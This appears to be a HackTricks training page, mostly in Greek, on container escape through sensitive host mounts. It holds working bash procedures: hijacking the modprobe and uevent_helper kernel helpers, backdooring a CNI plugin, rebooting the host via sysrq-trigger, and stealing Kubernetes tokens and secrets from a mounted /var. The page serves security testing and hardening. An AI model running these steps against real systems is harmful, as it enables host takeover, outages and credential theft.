# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Τα host mounts είναι μία από τις πιο σημαντικές πρακτικές επιφάνειες container-escape, επειδή συχνά καταρρίπτουν μια προσεκτικά απομονωμένη διεργασιακή προβολή και την επαναφέρουν σε άμεση ορατότητα των host resources. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Bind mounts του `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ή device-related paths μπορούν να εκθέσουν kernel controls, credentials, neighboring container filesystems και runtime management interfaces.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους προστατευτικές σελίδες επειδή το abuse model είναι cross-cutting. Ένα writable host mount είναι επικίνδυνο εν μέρει λόγω των mount namespaces, εν μέρει λόγω των user namespaces, εν μέρει λόγω της κάλυψης από AppArmor ή SELinux, και εν μέρει λόγω του ακριβούς host path που εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστό θέμα κάνει το attack surface πολύ πιο εύκολο να γίνει κατανοητό.

## `/proc` Exposure

Το procfs περιέχει τόσο συνηθισμένες πληροφορίες διεργασιών όσο και διεπαφές υψηλού impact για τον kernel control. Ένα bind mount όπως `-v /proc:/host/proc` ή μια container view που εκθέτει απροσδόκητα writable proc entries μπορεί επομένως να οδηγήσει σε information disclosure, denial of service ή άμεση host code execution.

Τα procfs paths υψηλής αξίας περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Ξεκινήστε ελέγχοντας ποια υψηλής αξίας procfs entries είναι ορατά ή writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτά τα paths είναι ενδιαφέροντα για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να γίνουν host code-execution paths όταν είναι writable. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` είναι ισχυρές πηγές reconnaissance για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν context διεργασιών, cgroup και filesystem που μπορούν να βοηθήσουν στην ανακατασκευή του host layout από μέσα από το container.

Η πρακτική αξία κάθε path είναι διαφορετική, και το να τα αντιμετωπίζεις όλα σαν να είχαν τον ίδιο αντίκτυπο κάνει το triage πιο δύσκολο:

- `/proc/sys/kernel/core_pattern`
Αν είναι writable, αυτό είναι ένα από τα procfs paths με τον μεγαλύτερο αντίκτυπο, επειδή ο kernel θα εκτελέσει έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει host code execution. Δες επίσης [read-only-paths.md](protections/read-only-paths.md) για ένα dedicated example.
- `/proc/sys/kernel/modprobe`
Αυτό το path ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει module-loading logic. Αν είναι writable από το container και ερμηνεύεται στο host context, μπορεί να γίνει ένα ακόμα host code-execution primitive. Είναι ιδιαίτερα ενδιαφέρον όταν συνδυάζεται με έναν τρόπο να ενεργοποιηθεί το helper path.
- `/proc/sys/vm/panic_on_oom`
Συνήθως δεν είναι ένα καθαρό escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε denial of service σε επίπεδο host, μετατρέποντας τα OOM conditions σε kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Αν το registration interface είναι writable, ο attacker μπορεί να καταχωρήσει έναν handler για μια επιλεγμένη magic value και να αποκτήσει execution στο host context όταν εκτελεστεί ένα matching file.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά να καθοριστεί ποια subsystems, mitigations και προαιρετικά kernel features είναι ενεργοποιημένα χωρίς να χρειάζονται host package metadata.
- `/proc/sysrq-trigger`
Κυρίως denial-of-service path, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic ή με άλλο τρόπο να διαταράξει αμέσως τον host.
- `/proc/kmsg`
Αποκαλύπτει μηνύματα του kernel ring buffer. Χρήσιμο για host fingerprinting, crash analysis και, σε ορισμένα περιβάλλοντα, για leak πληροφοριών χρήσιμων για kernel exploitation.
- `/proc/kallsyms`
Πολύτιμο όταν είναι readable, επειδή εκθέτει exported kernel symbol information και μπορεί να βοηθήσει στην παράκαμψη των υποθέσεων address randomization κατά την ανάπτυξη kernel exploits.
- `/proc/[pid]/mem`
Αυτό είναι ένα άμεσο process-memory interface. Αν η target process είναι προσβάσιμη με τις απαραίτητες ptrace-style συνθήκες, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης μιας άλλης διεργασίας. Ο ρεαλιστικός αντίκτυπος εξαρτάται πολύ από credentials, `hidepid`, Yama και ptrace restrictions, οπότε είναι ένα ισχυρό αλλά υπό προϋποθέσεις path.
- `/proc/kcore`
Εκθέτει μια core-image-style προβολή της μνήμης του συστήματος. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά readable δείχνει μια κακώς εκτεθειμένη επιφάνεια host memory.
- `/proc/kmem` και `/proc/mem`
Ιστορικά interfaces raw memory με υψηλό αντίκτυπο. Σε πολλά σύγχρονα συστήματα είναι απενεργοποιημένα ή αυστηρά περιορισμένα, αλλά αν υπάρχουν και είναι usable πρέπει να αντιμετωπίζονται ως κρίσιμα findings.
- `/proc/sched_debug`
Leak scheduling και task information που μπορεί να αποκαλύψει host process identities ακόμα και όταν άλλες process views φαίνονται πιο καθαρές από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Εξαιρετικά χρήσιμο για να ανακατασκευάσεις πού πραγματικά ζει το container στον host, ποια paths είναι overlay-backed και αν ένα writable mount αντιστοιχεί σε host content ή μόνο στο container layer.

Αν το `/proc/[pid]/mountinfo` ή οι overlay λεπτομέρειες είναι readable, χρησιμοποίησέ τα για να ανακτήσεις το host path του container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν τη μετατροπή μιας διαδρομής μέσα στο container στην αντίστοιχη διαδρομή από την οπτική γωνία του host.

### Full Example: `modprobe` Helper Path Abuse

Αν το `/proc/sys/kernel/modprobe` είναι writable από το container και η helper path ερμηνεύεται στο host context, μπορεί να ανακατευθυνθεί σε ένα payload υπό τον έλεγχο του attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Το ακριβές trigger εξαρτάται από το target και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι ένα writable helper path μπορεί να ανακατευθύνει μια μελλοντική kernel helper invocation σε attacker-controlled host-path content.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Αν ο στόχος είναι exploitability assessment και όχι immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν πρόσφατα kernel messages αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες kernel features ή mitigations είναι compiled in. Ο αντίκτυπος συνήθως δεν είναι άμεσο escape, αλλά μπορεί να συντομεύσει σημαντικά το kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
Το αποτέλεσμα είναι άμεση επανεκκίνηση του host. Αυτό δεν είναι ένα διακριτικό παράδειγμα, αλλά δείχνει ξεκάθαρα ότι η έκθεση του procfs μπορεί να είναι πολύ πιο σοβαρή από το information disclosure.

## `/sys` Exposure

Το sysfs εκθέτει μεγάλες ποσότητες kernel και device state. Ορισμένα sysfs paths είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση helper, τη συμπεριφορά συσκευών, τη ρύθμιση security-module ή την κατάσταση firmware.

High-value sysfs paths περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα paths έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά thermal-management και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με κακή έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να leak crash-dump και kernel-layout information που βοηθούν στο low-level host fingerprinting. Το `/sys/kernel/security` είναι το `securityfs` interface που χρησιμοποιείται από τα Linux Security Modules, οπότε η απροσδόκητη πρόσβαση εκεί μπορεί να αποκαλύψει ή να αλλοιώσει MAC-related state. Τα EFI variable paths μπορούν να επηρεάσουν firmware-backed boot settings, καθιστώντας τα πολύ πιο σοβαρά από τα συνηθισμένα configuration files. Το `debugfs` κάτω από `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο επειδή είναι σκόπιμα ένα developer-oriented interface με πολύ λιγότερες safety expectations από τα hardened production-facing kernel APIs.

Χρήσιμες εντολές review για αυτά τα paths είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι κάνει αυτές τις εντολές ενδιαφέρουσες:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποιο άλλο LSM surface είναι ορατό με τρόπο που θα έπρεπε να παραμένει μόνο στο host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και readable ή writable, να περιμένετε ένα ευρύ kernel-facing surface, του οποίου ο ακριβής κίνδυνος εξαρτάται από τα ενεργοποιημένα debug nodes.
- Η έκθεση των EFI variables είναι λιγότερο συνηθισμένη, αλλά αν υπάρχει, έχει υψηλό impact επειδή αφορά firmware-backed ρυθμίσεις και όχι συνηθισμένα runtime files.
- Το `/sys/class/thermal` σχετίζεται κυρίως με τη σταθερότητα του host και την αλληλεπίδραση με hardware, όχι με ένα καθαρό shell-style escape.
- Το `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή για host-fingerprinting και crash-analysis, χρήσιμη για την κατανόηση της χαμηλού επιπέδου κατάστασης του kernel.

### Full Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να εκτελέσει ένα helper που ελέγχεται από τον attacker όταν ενεργοποιηθεί ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος που αυτό λειτουργεί είναι ότι το helper path ερμηνεύεται από την οπτική γωνία του host. Μόλις ενεργοποιηθεί, το helper εκτελείται στο host context αντί μέσα στο τρέχον container.

## `/var` Exposure

Το mounting του host's `/var` σε ένα container συχνά υποτιμάται επειδή δεν φαίνεται τόσο δραματικό όσο το mounting του `/`. Στην πράξη, μπορεί να είναι αρκετό για πρόσβαση σε runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens και neighboring application filesystems. Σε σύγχρονα nodes, το `/var` είναι συχνά εκεί όπου ζει στην πραγματικότητα το πιο επιχειρησιακά ενδιαφέρον container state.

### Kubernetes Example

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει τα projected tokens άλλων pods και το overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες γιατί απαντούν αν το mount εκθέτει μόνο αδιάφορα application data ή high-impact cluster credentials. Ένα readable service-account token μπορεί αμέσως να μετατρέψει το local code execution σε Kubernetes API access.

Αν το token υπάρχει, επιβεβαίωσε τι μπορεί να προσπελάσει αντί να σταματήσεις στην εύρεση του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την τοπική πρόσβαση στον node. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα mounted `/var` σε compromise σε όλο το cluster.

### Docker And containerd Example

Σε Docker hosts τα σχετικά δεδομένα βρίσκονται συχνά κάτω από το `/var/lib/docker`, ενώ σε Kubernetes nodes που βασίζονται σε containerd μπορεί να βρίσκονται κάτω από το `/var/lib/containerd` ή σε paths ειδικά για το snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Αν το mounted `/var` εκθέτει writable snapshot περιεχόμενα ενός άλλου workload, ο attacker μπορεί να είναι σε θέση να τροποποιήσει application files, να φυτέψει web content, ή να αλλάξει startup scripts χωρίς να αγγίξει το τρέχον container configuration.

Συγκεκριμένες ιδέες abuse μόλις βρεθεί writable snapshot content:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων των mounted `/var`: application tampering, secret recovery, και lateral movement into neighboring workloads.

## Kubelet State, Plugins, And CNI Paths

Ένα mount του `/var/lib/kubelet`, `/opt/cni/bin`, ή `/etc/cni/net.d` συχνά εκτίθεται μέσω privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, και storage helpers. Αυτά τα mounts είναι εύκολο να απορριφθούν ως "node plumbing", αλλά βρίσκονται απευθείας στο execution path για νέα pods και συχνά περιέχουν kubelet credentials, projected secrets, registration sockets, και executable host-side plugin binaries.

Στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές ελέγχου είναι οι:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Γιατί αυτά τα paths έχουν σημασία:

- Το `/var/lib/kubelet/pki` μπορεί να αποκαλύψει kubelet client certificates και άλλα node-local credentials που μερικές φορές μπορούν να επαναχρησιμοποιηθούν εναντίον του API server ή των kubelet-facing TLS endpoints, ανάλογα με το cluster design.
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και mounted Secrets για γειτονικά pods στο ίδιο node.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` είναι κυρίως μια reconnaissance surface, αλλά πολύ χρήσιμη: αποκαλύπτει ποια pods και containers κατέχουν αυτή τη στιγμή GPUs, hugepages, SR-IOV devices και άλλους scarce node-local resources.
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και ποια sockets αναμένεται να προσεγγίσει το kubelet. Αν αυτά τα directories είναι writable αντί για απλώς readable, το finding γίνεται πολύ πιο σοβαρό.
- Το `/opt/cni/bin` και το `/etc/cni/net.d` βρίσκονται απευθείας στο pod-network setup path. Writable access εκεί είναι συχνά ένα delayed host-execution primitive και όχι απλώς exposure configuration.

### Full Example: Writable `/opt/cni/bin`

Αν ένα host CNI binary directory είναι mounted read-write, η αντικατάσταση ενός plugin μπορεί να είναι αρκετή για να αποκτήσεις host execution την επόμενη φορά που το kubelet δημιουργεί ένα pod sandbox σε αυτό το node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά είναι συχνά πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Το σημαντικό σημείο είναι ότι το modified binary εκτελείται αργότερα από το host network setup flow, όχι από το τρέχον container.


## Runtime Sockets

Τα Sensitive host mounts συχνά περιλαμβάνουν runtime sockets αντί για πλήρεις directories. Είναι τόσο σημαντικά που αξίζουν εδώ explicit repetition:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρη exploitation flows μόλις ένα από αυτά τα sockets γίνει mounted.

Ως ένα γρήγορο πρώτο interaction pattern:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Αν ένα από αυτά πετύχει, η διαδρομή από το "mounted socket" μέχρι το "start a more privileged sibling container" είναι συνήθως πολύ πιο σύντομη από οποιαδήποτε διαδρομή kernel breakout.

## Mount-Related CVEs

Τα host mounts επίσης τέμνονται με runtime vulnerabilities. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- `CVE-2024-21626` στο `runc`, όπου ένα leaked directory file descriptor θα μπορούσε να τοποθετήσει το working directory στο host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, και `CVE-2024-23653` στο BuildKit, όπου malicious Dockerfiles, frontends, και `RUN --mount` flows θα μπορούσαν να επανεισαγάγουν host file access, deletion, ή elevated privileges κατά τη διάρκεια builds.
- `CVE-2024-1753` στο Buildah και Podman build flows, όπου crafted bind mounts κατά τη διάρκεια build θα μπορούσαν να εκθέσουν το `/` read-write.
- `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά τη διάρκεια image unpack θα μπορούσε να επιτρέψει σε ένα specially crafted image να τροποποιήσει το host filesystem κατά τη διάρκεια pull.

Αυτά τα CVEs έχουν σημασία εδώ επειδή δείχνουν ότι το mount handling δεν αφορά μόνο τη ρύθμιση του operator. Το ίδιο το runtime μπορεί επίσης να εισαγάγει mount-driven escape conditions.

## Checks

Χρησιμοποίησε αυτές τις εντολές για να εντοπίσεις γρήγορα τα mount exposures με τη μεγαλύτερη αξία:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Τι είναι ενδιαφέρον εδώ:

- Το Host root, το `/proc`, το `/sys`, το `/var`, και τα runtime sockets είναι όλα findings υψηλής προτεραιότητας.
- Writable proc/sys entries συχνά σημαίνει ότι το mount εκθέτει host-global kernel controls αντί για ένα safe container view.
- Τα mounted `/var` paths αξίζουν review για credentials και neighboring workloads, όχι μόνο filesystem review.
- Τα kubelet state directories και τα CNI/plugin paths αξίζουν την ίδια προτεραιότητα με τα runtime sockets επειδή συχνά βρίσκονται απευθείας στο path δημιουργίας pod και διανομής credentials του node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
